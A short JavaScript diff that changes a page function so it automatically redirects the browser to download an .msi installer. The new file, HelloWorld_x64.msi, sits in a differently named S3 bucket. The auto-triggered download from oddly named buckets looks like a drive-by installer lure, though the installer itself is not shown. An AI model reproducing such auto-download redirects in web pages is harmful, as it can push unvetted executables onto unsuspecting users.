@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://gg622.s3.ap-southeast-2.amazonaws.com/HelloWorld.msi";
+		var url="https://hw625.s3.ap-southeast-2.amazonaws.com/HelloWorld_x64.msi";
 		window.location=url;
 	}
 }
